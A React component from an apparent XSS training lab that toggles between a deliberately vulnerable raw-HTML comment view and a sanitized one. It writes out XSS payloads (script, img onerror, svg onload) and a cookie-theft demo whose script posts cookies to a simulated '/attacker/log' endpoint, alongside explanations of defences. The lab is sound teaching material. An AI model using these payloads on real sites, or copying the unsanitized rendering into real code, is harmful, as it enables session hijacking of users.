import { useState, useEffect, useCallback } from 'react'
import api from '../utils/axiosConfig'
import { exploitPayloads } from '../utils/exploitPayloads'

function StoredXSS({ mode }) {
  const [comment, setComment] = useState('')
  const [comments, setComments] = useState([])
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState('')
  const [fetchingComments, setFetchingComments] = useState(false)
  const [clearingData, setClearingData] = useState(false)

  const fetchComments = useCallback(async () => {
    setFetchingComments(true)
    try {
      if (mode === 'vulnerable') {
        const response = await api.get('/stored/comments', {
          responseType: 'text'
        })
        setComments([{ text: 'Comments loaded from server HTML', rawHtml: response.data }])
        
        // Show that stored XSS is being executed
        if (response.data && response.data.includes('<script>')) {
          setResult('⚠️ Stored XSS payloads are now executing from database!')
          setTimeout(() => setResult(''), 5000)
        }
      } else {
        const response = await api.get('/stored/comments', {
          headers: { 'Accept': 'application/json' }
        })
        // Limit to last 3 comments
        const limitedComments = (response.data || []).slice(0, 3)
        setComments(limitedComments)
      }
    } catch (error) {
      console.error('Error fetching comments:', error)
      setResult('Error loading comments from server')
      setTimeout(() => setResult(''), 3000)
    } finally {
      setFetchingComments(false)
    }
  }, [mode])

  const deleteComment = async (commentId) => {
    try {
      await api.delete(`/stored/comment/${commentId}`)
      await fetchComments()
      setResult('Comment deleted successfully')
      setTimeout(() => setResult(''), 3000)
    } catch (error) {
      console.error('Error deleting comment:', error)
      setResult('Error deleting comment')
      setTimeout(() => setResult(''), 3000)
    }
  }

  useEffect(() => {
    fetchComments()
  }, [fetchComments])

  const handleSubmit = async (e) => {
    e.preventDefault()
    
    if (!comment.trim()) {
      setResult('Please enter a comment')
      setTimeout(() => setResult(''), 3000)
      return
    }
    
    setLoading(true)
    
    try {
      await api.post('/stored/comment', {
        text: comment,
        mode: mode
      })
      setComment('')
      await fetchComments()
      setResult(mode === 'vulnerable' 
        ? 'Comment stored! XSS payload saved to database.' 
        : 'Comment submitted safely!')
      setTimeout(() => setResult(''), 3000)
    } catch (error) {
      console.error('Error submitting comment:', error)
      setResult('Error submitting comment to server')
      setTimeout(() => setResult(''), 3000)
    } finally {
      setLoading(false)
    }
  }

  const clearComments = async () => {
    try {
      setClearingData(true)
      setResult('🗑️ Clearing comments...')
      
      // Clear comments from database
      await api.delete('/stored/comments')
      
      // Immediately clear the comments display
      setComments([])
      
      // Force a complete refresh of comments after a short delay to ensure clean state
      setTimeout(async () => {
        await fetchComments()
      }, 500)
      
      setResult('✅ All comments cleared from database and display')
      setTimeout(() => setResult(''), 3000)
    } catch (error) {
      console.error('Error clearing comments:', error)
      setResult('❌ Error clearing comments')
      setTimeout(() => setResult(''), 3000)
    } finally {
      setClearingData(false)
    }
  }

  const resetDatabase = async () => {
    if (!window.confirm('⚠️ This will permanently delete ALL data including comments, exploit logs, and attacker data. Are you sure?')) {
      return
    }
    
    try {
      setClearingData(true)
      setResult('🗑️ Resetting database...')
      
      // Clear the database
      const response = await api.delete('/stored/reset-database')
      
      // Immediately clear the comments display
      setComments([])
      
      // Force a complete refresh of comments after a short delay to ensure clean state
      setTimeout(async () => {
        await fetchComments()
      }, 500)
      
      setResult('✅ Database reset successfully! All comments cleared. Page refreshed.')
      setTimeout(() => setResult(''), 5000)
    } catch (error) {
      console.error('Error resetting database:', error)
      setResult('❌ Error resetting database')
      setTimeout(() => setResult(''), 3000)
    } finally {
      setClearingData(false)
    }
  }

  return (
    <div className="content-section">
      <div className="glass-card">
        <div className="section-header">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div>
              <h1 className="section-title">Stored XSS Attack</h1>
              <p className="section-subtitle">Test persistent cross-site scripting vulnerabilities</p>
            </div>
            <span className="badge">
              {mode === 'vulnerable' ? '⚠️ VULNERABLE' : '🔒 SECURE'}
            </span>
          </div>
        </div>

        <div className="alert-box">
          <h3 className="alert-title">⚠️ How Stored XSS Works</h3>
          <div className="alert-content">
            <p>
              Stored XSS occurs when malicious scripts are saved in the database and executed
              every time the data is displayed. This affects all users who view the content.
            </p>
            <div style={{ 
              marginTop: '1rem', 
              padding: '1rem', 
              background: 'rgba(59, 130, 246, 0.1)', 
              border: '1px solid rgba(59, 130, 246, 0.3)',
              borderRadius: '8px'
            }}>
              <h4 style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>🔄 Attack Flow:</h4>
              <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
                <p>1. <strong>Injection:</strong> Attacker submits malicious script in comment</p>
                <p>2. <strong>Storage:</strong> Server saves payload to database without sanitization</p>
                <p>3. <strong>Retrieval:</strong> Server loads comments from database</p>
                <p>4. <strong>Execution:</strong> Browser renders and executes the stored script</p>
                <p>5. <strong>Impact:</strong> Every user viewing comments gets infected</p>
              </div>
            </div>
            <p style={{ marginTop: '1rem', fontWeight: 600 }}>Try these payloads:</p>
            <div className="payload-grid" style={{ marginTop: '0.75rem' }}>
              {exploitPayloads.stored.map((payload, idx) => (
                <div key={idx} className="payload-item">
                  <code className="payload-code">{payload}</code>
                  <button
                    className="payload-button"
                    onClick={() => setComment(payload)}
                  >
                    Use
                  </button>
                </div>
              ))}
            </div>
            <p style={{ marginTop: '1rem', fontWeight: 600, color: '#fbbf24' }}>
              Impact: Stored XSS affects all users who view the comments. Payloads persist in the database.
            </p>
          </div>
        </div>

        <form onSubmit={handleSubmit} style={{ marginTop: '1.5rem' }}>
          <div className="form-group">
            <label htmlFor="comment" className="form-label">
              Add Comment:
            </label>
            <textarea
              id="comment"
              value={comment}
              onChange={(e) => setComment(e.target.value)}
              placeholder="Enter your comment or XSS payload"
              rows="4"
              className="form-textarea"
            />
            <small style={{ color: 'var(--text-secondary)', fontSize: '0.875rem', marginTop: '0.5rem', display: 'block' }}>
              {mode === 'vulnerable' 
                ? '⚠️ Vulnerable mode: HTML will be stored and executed'
                : '🔒 Secure mode: Input will be sanitized before storage'
              }
            </small>
            <small style={{ color: 'var(--text-muted)', fontSize: '0.75rem', marginTop: '0.25rem', display: 'block' }}>
              💡 <strong>Reset Database</strong> clears all data including comments, exploit logs, and attacker data for a fresh start
            </small>
          </div>
          
          <div style={{ display: 'flex', gap: '1rem', alignItems: 'center', flexWrap: 'wrap' }}>
            <button 
              type="submit" 
              disabled={loading}
              className={`btn ${loading ? 'btn-loading' : ''}`}
            >
              {loading ? 'Submitting...' : 'Submit Comment'}
            </button>
            
            <button
              type="button"
              onClick={clearComments}
              disabled={clearingData || loading}
              style={{
                padding: '0.5rem 1rem',
                background: clearingData ? 'rgba(107, 114, 128, 0.2)' : 'rgba(239, 68, 68, 0.2)',
                border: clearingData ? '1px solid rgba(107, 114, 128, 0.5)' : '1px solid rgba(239, 68, 68, 0.5)',
                borderRadius: '6px',
                color: clearingData ? '#9ca3af' : '#fca5a5',
                cursor: clearingData ? 'not-allowed' : 'pointer',
                fontSize: '0.875rem',
                opacity: clearingData ? 0.6 : 1
              }}
            >
              {clearingData ? '🔄 Clearing...' : '🗑️ Clear Comments'}
            </button>
            
            <button
              type="button"
              onClick={resetDatabase}
              disabled={clearingData || loading}
              style={{
                padding: '0.5rem 1rem',
                background: clearingData ? 'rgba(107, 114, 128, 0.2)' : 'rgba(220, 38, 127, 0.2)',
                border: clearingData ? '1px solid rgba(107, 114, 128, 0.5)' : '2px solid rgba(220, 38, 127, 0.5)',
                borderRadius: '6px',
                color: clearingData ? '#9ca3af' : '#f472b6',
                cursor: clearingData ? 'not-allowed' : 'pointer',
                fontSize: '0.875rem',
                fontWeight: 'bold',
                opacity: clearingData ? 0.6 : 1
              }}
            >
              {clearingData ? '🔄 Resetting...' : '🗑️ Reset Database'}
            </button>
            
            <button
              type="button"
              onClick={() => {
                setResult('🔄 Reloading stored payloads from database...')
                fetchComments()
              }}
              disabled={clearingData || loading}
              style={{
                padding: '0.5rem 1rem',
                background: 'rgba(59, 130, 246, 0.2)',
                border: '1px solid rgba(59, 130, 246, 0.5)',
                borderRadius: '6px',
                color: '#60a5fa',
                cursor: 'pointer',
                fontSize: '0.875rem'
              }}
            >
              🔁 Reload Comments
            </button>
            
            <button
              type="button"
              onClick={() => {
                if (window.confirm('This will refresh the entire page. Continue?')) {
                  window.location.reload()
                }
              }}
              style={{
                padding: '0.5rem 1rem',
                background: 'rgba(168, 85, 247, 0.2)',
                border: '1px solid rgba(168, 85, 247, 0.5)',
                borderRadius: '6px',
                color: '#c084fc',
                cursor: 'pointer',
                fontSize: '0.875rem'
              }}
            >
              🔄 Force Refresh Page
            </button>
            
            <div style={{ 
              padding: '0.5rem 1rem', 
              background: mode === 'vulnerable' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)', 
              border: mode === 'vulnerable' ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(16, 185, 129, 0.3)', 
              borderRadius: '6px',
              color: mode === 'vulnerable' ? '#fca5a5' : '#6ee7b7',
              fontSize: '0.875rem'
            }}>
              {mode === 'vulnerable' ? '⚠️ Database stores raw HTML' : '🛡️ Database stores sanitized text'}
            </div>
          </div>
        </form>

        {result && (
          <div style={{ 
            marginTop: '1rem', 
            padding: '1rem', 
            borderRadius: 'var(--radius-md)',
            background: result.includes('Error') ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)',
            border: result.includes('Error') ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(16, 185, 129, 0.3)',
            color: result.includes('Error') ? '#fca5a5' : '#6ee7b7'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <div style={{ 
                width: '8px', 
                height: '8px', 
                borderRadius: '50%', 
                background: result.includes('Error') ? '#ef4444' : '#10b981' 
              }}></div>
              <span style={{ fontWeight: 600 }}>{result}</span>
            </div>
          </div>
        )}

        <div style={{ marginTop: '2rem' }}>
          <div className="section-header">
            <h3 className="section-title" style={{ fontSize: '1.125rem' }}>Stored Comments (Last 3)</h3>
            <p className="section-subtitle">
              {mode === 'vulnerable' 
                ? '⚠️ Comments rendered with raw HTML - XSS payloads will execute'
                : '🔒 Comments safely escaped - XSS payloads are neutralized'
              }
            </p>
          </div>
          
          {fetchingComments || clearingData ? (
            <div style={{ 
              border: '2px solid rgba(59, 130, 246, 0.3)', 
              borderRadius: '8px', 
              padding: '2rem',
              textAlign: 'center',
              background: 'rgba(59, 130, 246, 0.05)'
            }}>
              <div style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>
                {clearingData ? 'Clearing comments...' : 'Loading comments...'}
              </div>
              <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
                {clearingData ? 'Removing all data from database and display' : 'Fetching stored data from database'}
              </div>
            </div>
          ) : mode === 'vulnerable' ? (
            comments.length > 0 && comments[0].rawHtml ? (
              <div style={{ 
                border: '2px solid rgba(239, 68, 68, 0.3)', 
                borderRadius: '8px', 
                padding: '1.5rem',
                background: 'rgba(239, 68, 68, 0.05)'
              }}>
                <div style={{ 
                  marginBottom: '1rem', 
                  padding: '0.75rem', 
                  background: 'rgba(239, 68, 68, 0.1)',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  borderRadius: '4px',
                  fontSize: '0.875rem',
                  color: '#fca5a5'
                }}>
                  <strong>⚠️ DANGER:</strong> Raw HTML from database being rendered below. XSS payloads will execute!
                  <div style={{ marginTop: '0.5rem', fontSize: '0.75rem' }}>
                    🔍 <strong>What to expect:</strong> Alerts, DOM changes, and script execution from stored payloads
                  </div>
                  <div style={{ 
                    marginTop: '0.75rem', 
                    padding: '0.5rem',
                    background: 'rgba(255, 193, 7, 0.1)',
                    border: '1px solid rgba(255, 193, 7, 0.3)',
                    borderRadius: '4px'
                  }}>
                    <strong>🔁 PERSISTENT EXECUTION:</strong> These payloads execute every time you:
                    <ul style={{ margin: '0.5rem 0 0 1.5rem', padding: 0 }}>
                      <li>Load this page</li>
                      <li>Refresh the browser</li>
                      <li>Switch between modes</li>
                    </ul>
                    <em>This demonstrates why Stored XSS is the most dangerous type!</em>
                  </div>
                </div>
                
                {/* Create a new window/popup for XSS execution */}
                <div style={{ marginBottom: '1rem' }}>
                  <button
                    onClick={() => {
                      // Create a proper HTML page with XSS execution
                      const newWindow = window.open('', '_blank', 'width=800,height=600,scrollbars=yes');
                      
                      // Set demo cookies for XSS to steal
                      document.cookie = 'stored_session=abc123; path=/';
                      document.cookie = 'stored_user=victim_user; path=/';
                      document.cookie = 'stored_token=secret_token; path=/';
                      
                      // Get the raw HTML content or create demo content
                      let storedContent = '';
                      if (comments[0] && comments[0].rawHtml) {
                        storedContent = comments[0].rawHtml;
                      } else {
                        // Create demo XSS content if no stored comments
                        storedContent = `
                          <div class="comment">
                            <div class="comment-header">Demo XSS Payload #1</div>
                            <div class="comment-content">
                              <script>alert('🚨 Stored XSS Alert #1: Basic Script Injection!')</script>
                              <p>This comment contains a basic script tag that should trigger an alert.</p>
                            </div>
                          </div>
                          <div class="comment">
                            <div class="comment-header">Demo XSS Payload #2</div>
                            <div class="comment-content">
                              <img src="x" onerror="alert('🖼️ Stored XSS Alert #2: Image onerror attack!')">
                              <p>This comment uses an image onerror event to execute JavaScript.</p>
                            </div>
                          </div>
                          <div class="comment">
                            <div class="comment-header">Demo XSS Payload #3</div>
                            <div class="comment-content">
                              <svg onload="alert('📊 Stored XSS Alert #3: SVG onload attack!')"></svg>
                              <p>This comment uses an SVG onload event for XSS execution.</p>
                            </div>
                          </div>
                          <div class="comment">
                            <div class="comment-header">Demo Cookie Theft</div>
                            <div class="comment-content">
                              <script>
                                setTimeout(() => {
                                  alert('🍪 Cookie Theft Demo: ' + document.cookie);
                                  if (window.collectData) {
                                    collectData('cookie_theft', document.cookie);
                                  }
                                }, 2000);
                              </script>
                              <p>This comment demonstrates cookie theft after a 2-second delay.</p>
                            </div>
                          </div>
                        `;
                      }
                      
                      const htmlContent = `
                        <!DOCTYPE html>
                        <html>
                        <head>
                          <title>Stored XSS Execution - VULNERABLE MODE</title>
                          <style>
                            body { 
                              font-family: Arial, sans-serif; 
                              padding: 20px; 
                              background: #fff5f5; 
                              color: #333;
                              line-height: 1.6;
                            }
                            .container { max-width: 800px; margin: 0 auto; }
                            .header {
                              background: #f8d7da;
                              border: 3px solid #dc3545;
                              padding: 20px;
                              border-radius: 8px;
                              margin-bottom: 20px;
                              text-align: center;
                            }
                            .comment { 
                              margin: 20px 0; 
                              padding: 20px; 
                              border: 2px solid #dc3545; 
                              background: #f8d7da; 
                              border-radius: 8px;
                              position: relative;
                            }
                            .comment-header {
                              font-weight: bold;
                              color: #dc3545;
                              margin-bottom: 10px;
                              border-bottom: 1px solid #dc3545;
                              padding-bottom: 5px;
                            }
                            .comment-content {
                              min-height: 30px;
                              margin: 15px 0;
                              padding: 10px;
                              background: rgba(255, 255, 255, 0.7);
                              border-radius: 4px;
                            }
                            .timestamp { 
                              color: #666; 
                              font-size: 0.9em; 
                              margin-top: 10px;
                            }
                            .warning {
                              background: #fff3cd;
                              border: 2px solid #ffeaa7;
                              padding: 15px;
                              border-radius: 4px;
                              margin: 20px 0;
                              font-weight: bold;
                            }
                            .execution-log {
                              background: #000;
                              color: #0f0;
                              padding: 15px;
                              border-radius: 4px;
                              font-family: monospace;
                              margin: 20px 0;
                              border: 2px solid #0f0;
                              max-height: 200px;
                              overflow-y: auto;
                            }
                          </style>
                        </head>
                        <body>
                          <div class="container">
                            <div class="header">
                              <h1>⚠️ STORED XSS EXECUTION CHAMBER ⚠️</h1>
                              <p><strong>VULNERABLE MODE ACTIVE</strong></p>
                              <p>This page will execute all stored XSS payloads from the database</p>
                            </div>
                            
                            <div class="warning">
                              🚨 <strong>WARNING:</strong> XSS payloads below will execute automatically!<br>
                              🍪 <strong>Cookies available for theft:</strong> stored_session, stored_user, stored_token<br>
                              🎯 <strong>Expected attacks:</strong> Alerts, DOM manipulation, cookie theft, data exfiltration
                            </div>
                            
                            <div class="execution-log">
                              <div>🔥 XSS EXECUTION LOG:</div>
                              <div id="executionLog">Initializing XSS execution environment...</div>
                            </div>
                            
                            <h2>📝 Stored Comments (Raw HTML Execution):</h2>
                            <div id="comments">
                              ${storedContent}
                            </div>
                            
                            <div style="margin-top: 30px; padding: 20px; background: #e7f3ff; border: 2px solid #007bff; border-radius: 8px;">
                              <h3>🔍 What's Happening Here?</h3>
                              <ul>
                                <li><strong>Stored XSS:</strong> Malicious scripts saved in database are now executing</li>
                                <li><strong>Persistent Attack:</strong> Every user who views this page gets infected</li>
                                <li><strong>Real Impact:</strong> In a real application, this would affect all users</li>
                                <li><strong>Attack Vectors:</strong> Cookie theft, session hijacking, keylogging, etc.</li>
                              </ul>
                            </div>
                          </div>
                          
                          <script>
                            // Set up execution logging
                            const log = document.getElementById('executionLog');
                            function addLog(message) {
                              log.innerHTML += '<br>🔥 ' + new Date().toLocaleTimeString() + ': ' + message;
                              log.scrollTop = log.scrollHeight;
                            }
                            
                            // Set demo cookies for XSS to steal
                            document.cookie = 'stored_session=abc123; path=/';
                            document.cookie = 'stored_user=victim_user; path=/';
                            document.cookie = 'stored_token=secret_token; path=/';
                            
                            addLog('Demo cookies set for XSS theft simulation');
                            addLog('Available cookies: ' + document.cookie);
                            addLog('XSS execution environment ready');
                            addLog('Stored payloads will execute below...');
                            
                            // Override alert to show in log as well
                            const originalAlert = window.alert;
                            window.alert = function(message) {
                              addLog('🚨 ALERT EXECUTED: ' + message);
                              return originalAlert(message);
                            };
                            
                            // Log any console messages
                            const originalConsoleLog = console.log;
                            console.log = function(...args) {
                              addLog('📝 CONSOLE: ' + args.join(' '));
                              return originalConsoleLog.apply(console, args);
                            };
                            
                            // Simulate attacker data collection
                            window.collectData = function(type, data) {
                              addLog('📡 DATA COLLECTED (' + type + '): ' + data);
                              // In real attack, this would send to attacker server
                              fetch('/attacker/log', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ type: type, data: data, source: 'stored_xss_window' })
                              }).then(() => {
                                addLog('📤 Data sent to attacker server');
                              }).catch(() => {
                                addLog('❌ Failed to send data (server may be down)');
                              });
                            };
                            
                            // Auto-collect cookies after a short delay
                            setTimeout(() => {
                              if (document.cookie) {
                                collectData('cookies', document.cookie);
                              }
                            }, 1000);
                            
                            addLog('🎯 Ready for XSS payload execution!');
                            
                            // Add a welcome message
                            setTimeout(() => {
                              addLog('🎬 XSS execution started - watch for alerts and DOM changes!');
                            }, 500);
                          </script>
                        </body>
                        </html>
                      `;
                      
                      newWindow.document.write(htmlContent);
                      newWindow.document.close();
                      
                      // Focus the new window
                      newWindow.focus();
                    }}
                    style={{
                      padding: '0.75rem 1.5rem',
                      background: 'rgba(239, 68, 68, 0.2)',
                      border: '2px solid rgba(239, 68, 68, 0.5)',
                      borderRadius: '6px',
                      color: '#fca5a5',
                      cursor: 'pointer',
                      fontWeight: 'bold',
                      fontSize: '0.9rem'
                    }}
                  >
                    🚀 Execute Stored XSS in New Window
                  </button>
                  
                  <button
                    onClick={async () => {
                      // Add some demo XSS payloads for testing
                      const demoPayloads = [
                        '<script>alert("🚨 Demo XSS #1: Basic Script Injection!")</script>',
                        '<img src="x" onerror="alert(\'🖼️ Demo XSS #2: Image onerror attack!\')">',
                        '<svg onload="alert(\'📊 Demo XSS #3: SVG onload attack!\')"></svg>'
                      ];
                      
                      try {
                        setResult('🧪 Adding demo XSS payloads for testing...');
                        
                        for (const payload of demoPayloads) {
                          await api.post('/stored/comment', {
                            text: payload,
                            mode: mode
                          });
                        }
                        
                        await fetchComments();
                        setResult('✅ Demo XSS payloads added! Now click "Execute XSS in New Window" to see them work.');
                        setTimeout(() => setResult(''), 5000);
                      } catch (error) {
                        setResult('❌ Error adding demo payloads');
                        setTimeout(() => setResult(''), 3000);
                      }
                    }}
                    style={{
                      padding: '0.5rem 1rem',
                      background: 'rgba(168, 85, 247, 0.2)',
                      border: '1px solid rgba(168, 85, 247, 0.5)',
                      borderRadius: '6px',
                      color: '#c084fc',
                      cursor: 'pointer',
                      fontSize: '0.875rem',
                      marginLeft: '1rem'
                    }}
                  >
                    🧪 Add Demo XSS Payloads
                  </button>
                  <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '0.5rem' }}>
                    Opens a dedicated XSS execution environment where stored payloads will run with full logging
                  </div>
                </div>
                
                {/* Show raw HTML for inspection */}
                <div style={{ 
                  background: 'rgba(0, 0, 0, 0.3)', 
                  padding: '1rem', 
                  borderRadius: '4px',
                  border: '1px solid rgba(255, 255, 255, 0.1)'
                }}>
                  <h4 style={{ color: '#fca5a5', marginBottom: '0.5rem' }}>Raw HTML from Database:</h4>
                  <pre style={{ 
                    whiteSpace: 'pre-wrap', 
                    wordBreak: 'break-all',
                    color: 'var(--text-primary)',
                    fontSize: '0.875rem',
                    margin: 0,
                    maxHeight: '200px',
                    overflow: 'auto'
                  }}>
                    {comments[0].rawHtml}
                  </pre>
                </div>
              </div>
            ) : (
              <div style={{ 
                border: '2px solid rgba(239, 68, 68, 0.3)', 
                borderRadius: '8px', 
                padding: '2rem',
                background: 'rgba(239, 68, 68, 0.05)'
              }}>
                <div className="empty-state">
                  <div className="empty-state-icon">💬</div>
                  <p className="empty-state-text">No comments stored yet.</p>
                  <p className="empty-state-subtext">Submit a comment above to see it stored in the database!</p>
                </div>
              </div>
            )
          ) : (
            <div style={{ 
              border: '2px solid rgba(20, 184, 166, 0.3)', 
              borderRadius: '8px', 
              padding: '1.5rem',
              background: 'rgba(20, 184, 166, 0.05)'
            }}>
              {comments.length === 0 ? (
                <div className="empty-state">
                  <div className="empty-state-icon">💬</div>
                  <p className="empty-state-text">No comments stored yet.</p>
                  <p className="empty-state-subtext">Submit a comment above to see it safely stored!</p>
                </div>
              ) : (
                <>
                  <div style={{ 
                    marginBottom: '1rem', 
                    padding: '0.75rem', 
                    background: 'rgba(16, 185, 129, 0.1)',
                    border: '1px solid rgba(16, 185, 129, 0.3)',
                    borderRadius: '4px',
                    fontSize: '0.875rem',
                    color: '#6ee7b7'
                  }}>
                    <strong>🛡️ SECURE:</strong> Comments below are safely escaped. XSS payloads are neutralized.
                  </div>
                  <div style={{ display: 'grid', gap: '1rem' }}>
                    {comments.map((c, idx) => (
                      <div key={c._id || idx} style={{ 
                        background: 'rgba(255, 255, 255, 0.05)', 
                        padding: '1rem', 
                        borderRadius: '8px',
                        border: '1px solid rgba(20, 184, 166, 0.2)',
                        position: 'relative'
                      }}>
                        <p style={{ color: 'var(--text-primary)', marginBottom: '0.5rem', wordBreak: 'break-word', paddingRight: '80px' }}>
                          {c.text}
                        </p>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <small style={{ color: 'var(--text-muted)' }}>
                            {new Date(c.createdAt).toLocaleString()}
                          </small>
                          <button
                            onClick={() => deleteComment(c._id)}
                            style={{
                              padding: '0.25rem 0.5rem',
                              background: 'rgba(239, 68, 68, 0.2)',
                              border: '1px solid rgba(239, 68, 68, 0.5)',
                              borderRadius: '4px',
                              color: '#fca5a5',
                              fontSize: '0.75rem',
                              cursor: 'pointer'
                            }}
                          >
                            Delete
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </>
              )}
            </div>
          )}
        </div>
      </div>

      <div className="glass-card">
        <div className="section-header">
          <h2 className="section-title">Understanding Stored XSS</h2>
          <p className="section-subtitle">The most dangerous type of XSS attack</p>
        </div>
        
        <div className="info-grid">
          <div className="info-card">
            <h3 className="info-card-title">🎯 Attack Characteristics</h3>
            <div className="info-card-content">
              <p><strong>Persistence:</strong> Malicious script stored in database</p>
              <p><strong>Scope:</strong> Affects every user viewing the content</p>
              <p><strong>Stealth:</strong> Executes automatically on page load</p>
              <p><strong>Impact:</strong> Most dangerous XSS type</p>
              <p><strong>Duration:</strong> Persists until data is cleaned</p>
            </div>
          </div>
          
          <div className="info-card">
            <h3 className="info-card-title">🛡️ Defense Strategies</h3>
            <div className="info-card-content">
              <p><strong>Input Validation:</strong> Validate and sanitize on server</p>
              <p><strong>Output Encoding:</strong> Escape HTML when displaying</p>
              <p><strong>Content Security Policy:</strong> Block inline scripts</p>
              <p><strong>HTML Sanitization:</strong> Use libraries like DOMPurify</p>
              <p><strong>Database Cleaning:</strong> Regular cleanup of malicious data</p>
            </div>
          </div>
        </div>

        <div style={{ marginTop: '2rem', padding: '1rem', background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: '8px' }}>
          <h4 style={{ color: '#fca5a5', marginBottom: '0.5rem' }}>⚠️ Why Stored XSS is Most Dangerous</h4>
          <div style={{ fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
            <p>• <strong>Persistent:</strong> Unlike reflected XSS, the payload is permanently stored</p>
            <p>• <strong>Widespread:</strong> Every user visiting the page gets infected</p>
            <p>• <strong>Automatic:</strong> No user interaction required to trigger</p>
            <p>• <strong>Trusted Context:</strong> Executes from the legitimate website</p>
            <p>• <strong>Hard to Detect:</strong> May go unnoticed for long periods</p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default StoredXSS

